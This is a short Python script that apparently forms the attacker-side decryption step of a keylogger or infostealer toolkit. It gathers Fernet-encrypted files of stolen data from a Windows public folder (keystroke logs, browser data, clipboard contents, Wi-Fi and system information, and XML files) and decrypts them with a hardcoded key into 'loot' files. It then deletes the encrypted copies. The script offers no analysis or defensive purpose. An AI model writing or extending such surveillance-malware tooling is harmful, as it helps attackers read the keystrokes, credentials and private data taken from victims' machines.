# After receiving all the gathered data, download and move them to the path specified in this file.
import sys, os, re, pathlib
from cryptography.fernet import Fernet
import logging

if __name__ == '__main__':
    try:
        path = 'C:/Users/Public/Logs/'
        encrypted_files = [ 'e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt', 'e_browser.txt', 'e_key_logs.txt' ]
        regex = re.compile(r'.+\.xml$')

        for dirpath, dirnames, filenames in os.walk(path):
            [ encrypted_files.append(file) for file in filenames if regex.match(file) ]

        key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='

        for file_decrypt in encrypted_files:
            with open(path + file_decrypt, 'rb') as x:
                data = x.read()
            decrypted = Fernet(key).decrypt(data)
            with open(path + file_decrypt[2:], 'ab') as loot:
                loot.write(decrypted)
            os.remove(path + file_decrypt)

    except KeyboardInterrupt:
        print('* Ctrl + C detected...program exiting *')

    except Exception as ex:
        logging.exception('* Error Occured: {}*'.format(ex))
